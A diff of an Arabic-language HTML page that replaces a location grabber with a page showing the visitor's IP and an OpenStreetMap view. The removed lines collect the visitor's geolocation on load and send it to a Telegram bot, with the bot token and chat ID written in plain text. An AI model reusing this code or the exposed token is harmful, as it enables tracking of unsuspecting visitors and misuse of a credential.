@@ -1,43 +1,29 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>تحديد الموقع</title>
-  <script>
-    window.onload = function() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(success, error);
-      } else {
-        alert("المتصفح لا يدعم تحديد الموقع");
-      }
-
-      function success(position) {
-        var lat = position.coords.latitude;
-        var lon = position.coords.longitude;
-
-        var token = "7876861765:AAFHhXiCHpDM7qeYLZNEfq1WoEpD9vErTr8";
-        var chat_id = "5880561408";
-        var message = "تم تحديد موقع جديد:\nخط العرض: " + lat + "\nخط الطول: " + lon;
-
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-
-        fetch(url)
-          .then(response => {
-            if (response.ok) {
-              alert("تم إرسال الموقع إلى البوت!");
-            } else {
-              alert("فشل إرسال الموقع.");
-            }
-          });
-      }
-
-      function error(err) {
-        alert("تعذر الحصول على الموقع: " + err.message);
-      }
-    };
-  </script>
+  <title>موقعي و عنوان IP</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 </head>
 <body>
-  <h2 style="text-align:center;margin-top:50px;">يتم الآن تحديد موقعك...</h2>
+  <h2>عنوان IP الخاص بك: <span id="ip">جارٍ التحميل...</span></h2>
+  <div id="map" style="height: 500px;"></div>
+
+  <script>
+    // عرض الـ IP
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById("ip").innerText = data.ip;
+      });
+
+    // عرض الخارطة
+    var map = L.map('map').setView([30.0444, 31.2357], 13); // مثال: القاهرة
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '© OpenStreetMap contributors'
+    }).addTo(map);
+  </script>
 </body>
 </html>
